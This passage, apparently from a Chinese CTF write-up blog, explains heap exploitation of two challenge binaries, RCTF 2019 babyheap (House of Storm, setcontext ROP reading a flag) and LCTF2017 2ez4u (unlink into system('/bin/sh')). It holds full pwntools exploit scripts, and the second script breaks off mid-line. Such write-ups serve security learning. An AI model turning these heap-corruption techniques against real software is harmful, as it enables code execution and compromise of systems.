会将所分配的内存空间中的每一位都初始化为零<br>也就是说,如果你是为字符类型或整数类型的元素分配内存,那么这些元素将保证会被初始化为0;<br>如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针;<br>如果你为实型数据分配内存,则这些元素会被初始化为浮点型的零.</p></blockquote><h4 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h4><p>随后large bin 操作，实现overlap，构造chunk改bk 和bk_nextsize(house of storm)<br>指向free_hook<br>然后我们在一个chunk里填入orw的rop链<br>再往free_hook里面填入setcontext+53的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>si <span class="number">0x00007f52b004ab85</span></span><br><span class="line">   <span class="number">0x7f52b004ab85</span> &lt;setcontext+<span class="number">53</span>&gt;:mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab8c</span> &lt;setcontext+<span class="number">60</span>&gt;:mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab93</span> &lt;setcontext+<span class="number">67</span>&gt;:mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab97</span> &lt;setcontext+<span class="number">71</span>&gt;:mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab9b</span> &lt;setcontext+<span class="number">75</span>&gt;:mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab9f</span> &lt;setcontext+<span class="number">79</span>&gt;:mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line">   <span class="number">0x7f52b004aba3</span> &lt;setcontext+<span class="number">83</span>&gt;:mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br><span class="line">   <span class="number">0x7f52b004aba7</span> &lt;setcontext+<span class="number">87</span>&gt;:mov    rcx,QWORD PTR [rdi+<span class="number">0xa8</span>]</span><br><span class="line">   <span class="number">0x7f52b004abae</span> &lt;setcontext+<span class="number">94</span>&gt;:push   rcx</span><br><span class="line">   <span class="number">0x7f52b004abaf</span> &lt;setcontext+<span class="number">95</span>&gt;:mov    rsi,QWORD PTR [rdi+<span class="number">0x70</span>]</span><br><span class="line">   <span class="number">0x7f52b004abb3</span> &lt;setcontext+<span class="number">99</span>&gt;:mov    rdx,QWORD PTR [rdi+<span class="number">0x88</span>]</span><br><span class="line">   <span class="number">0x7f52b004abba</span> &lt;setcontext+<span class="number">106</span>&gt;:mov    rcx,QWORD PTR [rdi+<span class="number">0x98</span>]</span><br><span class="line">   <span class="number">0x7f52b004abc1</span> &lt;setcontext+<span class="number">113</span>&gt;:mov    r8,QWORD PTR [rdi+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7f52b004abc5</span> &lt;setcontext+<span class="number">117</span>&gt;:mov    r9,QWORD PTR [rdi+<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x7f52b004abc9</span> &lt;setcontext+<span class="number">121</span>&gt;:mov    rdi,QWORD PTR [rdi+<span class="number">0x68</span>]</span><br><span class="line">   <span class="number">0x7f52b004abcd</span> &lt;setcontext+<span class="number">125</span>&gt;:xor    eax,eax</span><br><span class="line">   <span class="number">0x7f52b004abcf</span> &lt;setcontext+<span class="number">127</span>&gt;:ret</span><br></pre></td></tr></table></figure><p>通过上面的gadget我们可以知道</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdi在[rdi+<span class="number">0x68</span>]上</span><br><span class="line">rsp在[rdi+<span class="number">0xa0</span>]上</span><br></pre></td></tr></table></figure><p>我们依照相应的位置写入rop的数据<br>执行free操作的时候就可以调用rop链了</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["tmux","split","-h"]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'4'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0 0x21</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#1 0x31</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x50</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_address)</span><br><span class="line">free_hook = libc.symbols[<span class="string">"__free_hook"</span>]+libc_address</span><br><span class="line">fake_chunk = free_hook - <span class="number">0x20</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#11 -&gt; old chunk2-&gt;smallbin 0xe0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2 -&gt; chunk2 -&gt; smallbin</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xe0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)<span class="comment"># --&gt;0x508</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x4d0</span>)</span><br><span class="line"><span class="comment"># delete(8) #unsorted bin</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#15</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment"># free -&gt;chunk5 but chunk8 here</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造一个largebin 一个unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#chunk5-&gt;largebin </span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#chunk2-&gt;unsortedbin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk) +p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment"># bk fackchunk-&gt;fd</span></span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   <span class="comment">#bk --&gt;fakechunk-&gt;bk</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#size 0x56</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">15</span>,payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># edit(8,p64(0)*3+p64(0x511))</span></span><br><span class="line">ret = libc_address+<span class="number">0x937</span></span><br><span class="line">p_rdi_r = libc_address+ <span class="number">0x21112</span> <span class="comment">#0x21102</span></span><br><span class="line">p_rsi_r = libc_address+ <span class="number">0x202f8</span> <span class="comment">#0x202e8</span></span><br><span class="line">p_rdx_r = libc_address+<span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">"flag"</span>.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(heap_base+<span class="number">0x1c0</span>)   <span class="comment">#[rdi+0x68] is rdi</span></span><br><span class="line">rop_chain += p64(<span class="number">0</span>) <span class="comment">#[rdi+0x70] is rsi</span></span><br><span class="line">rop_chain += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>)  <span class="comment">#[rdi+0x88] is rdx</span></span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0xa0</span>,<span class="string">"\x00"</span>)</span><br><span class="line">rop_chain += p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"open"</span>]+libc_address)</span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0x100</span>,<span class="string">"\x00"</span>)</span><br><span class="line"><span class="comment">#now read and write</span></span><br><span class="line">rop_chain += p64(p_rdi_r)+p64(<span class="number">3</span>)+p64(p_rsi_r)+p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x200</span>)</span><br><span class="line">rop_chain += p64(p_rdx_r)+p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"read"</span>]+libc_address)</span><br><span class="line"></span><br><span class="line">rop_chain += p64(p_rdi_r)+p64(<span class="number">1</span>)+p64(p_rsi_r)+p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x200</span>)</span><br><span class="line">rop_chain += p64(p_rdx_r)+p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"write"</span>]+libc_address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>,rop_chain)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">"A"</span>*<span class="number">0x10</span>+p64(libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">53</span>+libc_address))</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.rois.io/2019/rctf-2019-official-writeup/" target="_blank" rel="noopener">https://blog.rois.io/2019/rctf-2019-official-writeup/</a><br><a href="https://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/" target="_blank" rel="noopener">https://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/</a></p><h3 id="LCTF2017-2ez4u"><a href="#LCTF2017-2ez4u" class="headerlink" title="LCTF2017 2ez4u"></a>LCTF2017 2ez4u</h3><p>漏洞点是uaf<br>官方wp给的是largebin的操作<br>感觉看起来好复杂啊，调试也要调很久</p><p>用了unlink来控制堆块，然后两个smallbin绕过’\x00’，后面还将堆块劫持到main_arena上，多add几个大的chunk，到达freehook的位置，并赋值为system，然后再通过chunk1(unlink处理的chunk，overlap了很多个smallbin)，改chunk2的fd为’/bin/sh’,<code>free(2)-&gt;system(&#39;/bin/sh&#39;)</code></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">"./2ez4u"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./2ez4u'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,desc,color=<span class="string">'0'</span>,value=<span class="string">'0'</span>,num=<span class="string">'0'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"n):"</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line">    p.recvuntil(<span class="string">"999):"</span>)</span><br><span class="line">    p.sendline(str(value))</span><br><span class="line">    p.recvuntil(<span class="string">"-16):"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"024):"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"apple:"</span>)</span><br><span class="line">    p.send(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,desc,color=<span class="string">'3'</span>,value=<span class="string">'1000'</span>,num=<span class="string">'100'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0-15):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"n):"</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line">    p.recvuntil(<span class="string">"999):"</span>)</span><br><span class="line">    p.sendline(str(value))</span><br><span class="line">    p.recvuntil(<span class="string">"-16):"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"apple:"</span>)</span><br><span class="line">    p.send(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0-15):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0-15):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a\n'</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a\n'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'b\n'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x3e0</span>,<span class="string">"a\n"</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"a\n"</span>)  <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x3f0</span>,<span class="string">"a\n"</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a\n"</span>)  <span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'a\n'</span>)  <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'a\n'</span>)  <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'a\n'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x290</span>,<span class="string">'b\n'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'a\n'</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">"a\n"</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"description:"</span>)</span><br><span class="line">    heap_base=u64(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x4e0</span><span class="number">-0x30</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unlink_addr=heap_base+<span class="number">0x58</span> <span class="comment">#chunk1-&gt;bk_nextsize</span></span><br><span class="line">    fake_large=heap_base+<span class="number">0x910</span>+<span class="number">0x30</span>   <span class="comment">#0x940 chunk6</span></span><br><span class="line">    payload=p64(<span class="number">0x411</span>)+p64(unlink_addr<span class="number">-0x18</span>)+p64(unlink_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,p64(fake_large)+<span class="string">'\n'</span>) <span class="comment">## write large bin address to bypass unlink the largebin</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#chunk6-10构成的fake_chunk</span></span><br><span class="line">    edit(<span class="number">6</span>,payload+<span class="string">"\n"</span>)</span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0x218</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x70</span>)+<span class="string">'\n'</span>)  <span class="comment">#chunk6-10构成的fake_chunk</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># log.info("fake large bin: %s"%hex(fake_large))</span></span><br><span class="line">    payload=p64(fake_large)+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">3</span>,payload) <span class="comment">#chunk3‘s bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)  <span class="comment">## unlink   clear 1st to avoid overwrite the 3rd ptr</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line">    delete(<span class="number">7</span>)   <span class="comment"># delete the same size chunk to smallbin to bypass '\x00' truncated in add</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(heap_base+<span class="number">0xdc0</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span></span><br><span class="line">    add(<span class="number">0x3f0</span>,payload) <span class="comment"># 1 malloc out the fake largebin</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">3</span>,p64(heap_base+<span class="number">0x510</span>)+<span class="string">'\n'</span>) <span class="comment">## fix the largebin chain</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'1\n'</span>) <span class="comment">#3 ##在0xdc的地方malloc了，之后将chunk7的fd位置直接链接到了main_arena -&gt; show chunk1就能得到libc地址</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span 